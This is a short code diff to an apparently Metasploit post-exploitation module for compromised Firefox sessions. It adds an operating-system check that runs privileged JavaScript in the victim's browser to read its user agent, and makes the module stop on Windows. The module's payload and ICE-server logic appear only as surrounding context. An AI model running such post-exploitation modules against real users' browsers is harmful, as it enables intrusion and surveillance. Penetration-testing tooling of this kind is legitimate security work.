@@ -31,6 +31,11 @@ class Metasploit3 < Msf::Post
   end
 
   def run
+    unless os_check
+      print_error "Windows versions of Firefox are not supported at this time [RM #8810]."
+      return
+    end
+
     server     = datastore['ICESERVER']
     offerer_id = Rex::Text.rand_text_alphanumeric(10)
     channel    = Rex::Text.rand_text_alphanumeric(20)
@@ -47,6 +52,14 @@ class Metasploit3 < Msf::Post
         print_warning "No response received"
       end
     end
+  end
+
+  def os_check
+    user_agent = js_exec(%Q|
+      return Components.classes["@mozilla.org/network/protocol;1?name=http"]
+        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
+    |)
+    user_agent !~ /windows/i
   end
 
   def js_payload(server, offerer_id, channel)
